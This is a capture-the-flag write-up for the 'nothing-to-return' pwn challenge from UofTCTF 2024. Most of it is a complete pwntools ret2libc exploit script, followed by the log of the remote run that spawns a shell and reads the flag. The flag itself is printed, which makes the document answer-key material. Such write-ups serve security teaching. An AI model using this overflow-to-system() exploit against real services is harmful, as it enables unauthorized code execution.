# nothing-to-return [137 Solves]

## Description

> Now this challenge has a binary of a very small size.
>
> "The binary has no useful gadgets! There is just nothing to return to!"
>
> nice try... ntr
>
> Author: drec
>
> `nc 34.30.126.104 5000`
>
> Attachments: ld-linux-x86-64.so.2, libc.so.6, nothing-to-return

## Short Solution

Basic ret2libc

## Solution

### Basic file checks

```console
$ file nothing-to-return
nothing-to-return: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ld-linux-x86-64.so.2, BuildID[sha1]=fba831e950a088abe29e327d3556cc8e0c4f881d, for GNU/Linux 4.4.0, not stripped

$ checksec nothing-to-return
[*] '/root/ctf/UofTCTF_2024/pwn/nothing-to-return/nothing-to-return'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  b'.'
```

### solver.py

I used ret instruction of nothing-to-return and pop edi, ret instruction of libc.

```python
from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "split-window", "-h"]

elf = ELF("./nothing-to-return", checksec=False)
rop = ROP(elf)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

context.binary = elf


def conn() -> pwnlib.tubes:
    if args.REMOTE:
        io = remote("34.30.126.104", 5000)

    elif args.GDB:
        gdbscript = """
        b *main+108
        c
        """
        pty = process.PTY
        io = gdb.debug([elf.path], gdbscript=gdbscript, stdin=pty, stdout=pty)
    else:
        pty = process.PTY
        io = elf.process(stdin=pty, stdout=pty)

    return io


def main():
    io = conn()
    io.recvuntil(b"printf is at ")
    leak = int(io.recvS(14), 16)

    log.info(f"leak printf: {hex(leak)}")

    libc.address = leak - libc.sym["printf"]

    binsh = next(libc.search(b"/bin/sh"))
    ret = ROP(elf).find_gadget(["ret"])[0]
    pop_rdi = ROP(libc).find_gadget(["pop rdi", "ret"])[0]

    log.info(f"pop_rdi: {hex(pop_rdi)}")
    log.info(f"libc base: {hex(libc.address)}")
    log.info(f"system: {hex(libc.sym['system'])}")
    log.info(f"binsh: {hex(binsh)}")

    offset = 72
    payload = (
        b"A" * offset + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(libc.sym["system"])
    )

    io.sendlineafter(b"Input size:", str(len(payload)).encode())
    io.sendlineafter(b"Enter your input:", payload)
    io.interactive("")


if __name__ == "__main__":
    main()
```

Result:

```console
$ python3 solver.py REMOTE
[*] Loaded 5 cached gadgets for './nothing-to-return'
[*]
[+] Opening connection to 34.30.126.104 on port 5000: Done
[DEBUG] Received 0x3f bytes:
    b'printf is at 0x7e9221ac8250\n'
    b'Hello give me an input\n'
    b'Input size:\n'
[*] leak printf: 0x7e9221ac8250
[*] Loaded 216 cached gadgets for './libc.so.6'
[*] pop_rdi: 0x7e9221a9a265
[*] libc base: 0x7e9221a72000
[*] system: 0x7e9221ac1760
[*] binsh: 0x7e9221c11e34
[DEBUG] Sent 0x4 bytes:
    b'104\n'
[DEBUG] Received 0x12 bytes:
    b'Enter your input:\n'
[DEBUG] Sent 0x69 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000040  41 41 41 41  41 41 41 41  1a 10 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000050  65 a2 a9 21  92 7e 00 00  34 1e c1 21  92 7e 00 00  │e··!│·~··│4··!│·~··│
    00000060  60 17 ac 21  92 7e 00 00  0a                        │`··!│·~··│·│
    00000069
[*] Switching to interactive mode

[DEBUG] Received 0x65 bytes:
    00000000  49 27 6d 20  72 65 74 75  72 6e 69 6e  67 20 74 68  │I'm │retu│rnin│g th│
    00000010  65 20 69 6e  70 75 74 3a  0a 41 41 41  41 41 41 41  │e in│put:│·AAA│AAAA│
    00000020  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000060  41 1a 10 40  0a                                     │A··@│·│
    00000065
I'm returning the input:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1a\x10@
ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x28 bytes:
    b'flag\n'
    b'ld-linux-x86-64.so.2\n'
    b'libc.so.6\n'
    b'run\n'
flag
ld-linux-x86-64.so.2
libc.so.6
run
cat flag
[DEBUG] Sent 0x9 bytes:
    b'cat flag\n'
[DEBUG] Received 0x1f bytes:
    b'uoftctf{you_can_always_return}\n'
uoftctf{you_can_always_return}
```

### Flag

uoftctf{you_can_always_return}
